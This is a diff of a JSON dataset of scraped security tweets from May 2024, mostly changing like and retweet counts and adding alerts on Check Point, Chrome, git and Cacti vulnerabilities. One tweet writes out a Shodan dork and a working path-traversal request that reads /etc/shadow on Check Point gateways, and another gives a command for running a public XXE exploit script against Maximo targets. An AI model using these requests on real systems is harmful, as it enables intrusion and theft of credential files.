@@ -51,10 +51,10 @@
     "username": "thezdi"
 }
 {
-    "tweetfavorites": 687,
+    "tweetfavorites": 681,
     "tweetquotes": 6,
-    "tweetreplies": 10,
-    "tweetretweets": 130,
+    "tweetreplies": 9,
+    "tweetretweets": 129,
     "tweettext": "For this vulnerability, just type shodan title:\"Check Point\" ssl:\"target\"\n\nCVE-2024-24919\n\nPOST /clients/MyCRL HTTP/1.1\nhost: target\nContent-Length: 39\n\naCSHELL/../../../../../../../etc/shadow\n\n#SSLVPN  #BugBounty https://t.co/VvnMkuC6P1",
     "tweettime": "2024-05-30, 11:28:49",
     "tweeturl": "https://twitter.com/ynsmroztas/status/1796141710507946169",
@@ -72,6 +72,20 @@
     "tweettime": "2024-05-30, 09:42:27",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1796114942325608884",
     "username": "h4x0r_dz"
+}
+{
+    "expanded_url": [
+        "https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/#/",
+        "http://hunter.how"
+    ],
+    "tweetfavorites": 378,
+    "tweetquotes": 9,
+    "tweetreplies": 7,
+    "tweetretweets": 124,
+    "tweettext": "🚨Alert🚨CVE-2024-24919: A path traversal leading to an arbitrary file read! \n🔥Deep Research:https://t.co/JB4tip0IOX\n⚠It is an arbitrary file read, allowing people to read any file on the system.\n📊109K+ Services are found on https://t.co/ysWb28Crld\n🔗Hunter https://t.co/m9VZkf00MQ",
+    "tweettime": "2024-05-30, 07:28:14",
+    "tweeturl": "https://twitter.com/HunterMapping/status/1796081167617405330",
+    "username": "HunterMapping"
 }
 {
     "expanded_url": [
@@ -103,10 +117,10 @@
     "expanded_url": [
         "https://thehackernews.com/2024/05/google-detects-4th-chrome-zero-day-in.html"
     ],
-    "tweetfavorites": 229,
-    "tweetquotes": 8,
+    "tweetfavorites": 218,
+    "tweetquotes": 7,
     "tweetreplies": 3,
-    "tweetretweets": 167,
+    "tweetretweets": 158,
     "tweettext": "🔥 Urgent: Google released security updates for Chrome to fix a new ZERO-DAY (CVE-2024-5274) under active exploitation in the wild.\n\nDetails - https://t.co/SzLnSe3nkF\n\nUsers of Chromium-based browsers like Microsoft Edge, Brave, Opera, and Vivaldi should watch for patches.",
     "tweettime": "2024-05-24, 10:10:46",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1793947744618385566",
@@ -176,10 +190,10 @@
     "username": "HunterMapping"
 }
 {
-    "tweetfavorites": 349,
-    "tweetquotes": 3,
+    "tweetfavorites": 345,
+    "tweetquotes": 2,
     "tweetreplies": 9,
-    "tweetretweets": 63,
+    "tweetretweets": 61,
     "tweettext": "Just reversed the recent git RCE: CVE-2024-32002. This was a great find and was very satisying to work on!\n\nThe exploit is pretty straightforward: an attacker just needs to get you to clone a repository recursively.\n\nWorks on Mac too. Make sure to patch your Git!\n\n#CVE-2024-32002 https://t.co/u7LFIjF13b",
     "tweettime": "2024-05-17, 20:28:50",
     "tweeturl": "https://twitter.com/amalmurali47/status/1791566569501573163",
@@ -228,14 +242,27 @@
     "expanded_url": [
         "https://github.com/Ibonok/CVE-2020-4463/"
     ],
-    "tweetfavorites": 354,
+    "tweetfavorites": 376,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 75,
+    "tweetretweets": 81,
     "tweettext": "If you discover a domain / subdomain using IBM Maximo Asset Management, be sure to check if it is XXE 🥳💰🤗\n\nUse ;\n\npython3 CVE-2020-4463[.]py --url http :// target / -x ( -x for xxe, -d for Data Leak)\n\nhttps://t.co/DIGucYqJIL\n\n#BugBounty #BugBountyTips https://t.co/MNsCVVrq8M",
     "tweettime": "2024-05-15, 20:27:01",
     "tweeturl": "https://twitter.com/ynsmroztas/status/1790841337224331561",
     "username": "ynsmroztas"
+}
+{
+    "expanded_url": [
+        "https://github.com/Cacti/cacti/security/advisories/GHSA-cr28-x256-xf5m"
+    ],
+    "tweetfavorites": 246,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 85,
+    "tweettext": "🚨Alert🚨CVE-2024-29895(CVSS:10): Critical Command Injection  Vulnerabilities in Cacti: \n🔥PoC: https://t.co/aiUmqccAYz\n⚠This vulnerability can be exploited remotely using the Cacti web interface, allowing an attacker to execute arbitrary commands on the Cacti server. https://t.co/4ftcUc51S2",
+    "tweettime": "2024-05-15, 05:50:16",
+    "tweeturl": "https://twitter.com/HunterMapping/status/1790620695371911388",
+    "username": "HunterMapping"
 }
 {
     "expanded_url": [
@@ -338,6 +365,19 @@
 }
 {
     "expanded_url": [
+        "https://thehackernews.com/2024/05/chrome-zero-day-alert-update-your.html"
+    ],
+    "tweetfavorites": 396,
+    "tweetquotes": 11,
+    "tweetreplies": 9,
+    "tweetretweets": 250,
+    "tweettext": "WARNING: Using #Chrome or any Chromium-based browsers? Don't wait—update your browser ASAP!\n\nGoogle has just released an update to patch a new zero-day flaw, CVE-2024-4671, which hackers are actively exploiting in the wild.\n\nDetails https://t.co/6ERkGjdmgo\n\n#cybersecurity",
+    "tweettime": "2024-05-10, 10:44:11",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1788882720568889797",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
         "https://securityonline.info/google-rushes-to-patch-chrome-zero-day-exploit-cve-2024-4671/"
     ],
     "tweetfavorites": 64,
@@ -394,7 +434,7 @@
     "expanded_url": [
         "https://security.samsungmobile.com/securityUpdate.smsb"
     ],
-    "tweetfavorites": 115,
+    "tweetfavorites": 113,
     "tweetquotes": 0,
     "tweetreplies": 3,
     "tweetretweets": 16,
